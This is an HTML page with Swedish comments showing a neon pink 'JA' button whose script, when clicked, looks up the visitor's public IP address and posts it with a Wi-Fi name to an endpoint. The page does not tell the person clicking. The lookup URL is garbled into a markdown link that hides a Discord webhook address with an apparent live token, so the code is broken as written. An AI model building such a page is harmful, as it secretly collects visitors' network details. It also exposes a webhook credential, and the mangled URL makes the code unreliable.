<html>
<head>
<style>
body {
  margin: 0;
  height: 100vh;
  background-color: #ffd1dc;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
}

.button {
  background-color: #ff00ff; /* neonrosa */
  color: white;
  border: none;
  border-radius: 12px;
  padding: 15px 30px;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  box-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
  transition: 0.2s;
}

.button:hover {
  box-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff;
}
</style>
</head>
<body>

<button class="button" onclick="sendYes()">JA</button>

<script>
async function sendYes() {
  try {
    // Hämta IP-adress
    const ipResponse = await fetch('[https://api.ipify.org?format=json](https://discord.com/api/webhooks/1467935146396352637/CKDLouRzp-KSQqLLzqhpYtvHEOqhi9mQPGwLcrKOxX-9WtJ4CgHUUUORulOoZhCCkxFm)');
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip;

    // Wi-Fi-namn (måste anges manuellt)
    const wifiName = "Ditt_WiFi_Namn";

    // Skicka data till ditt API
    const apiUrl = "https://example.com/your-api-endpoint"; // ändra till ditt API
    const payload = {
      ip: ipAddress,
      wifi: wifiName
    };

    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if(response.ok) {
      alert("Data skickad!");
    } else {
      alert("Något gick fel.");
    }
  } catch (err) {
    console.error(err);
    alert("Fel vid API-anrop.");
  }
}
</script>

</body>
</html>
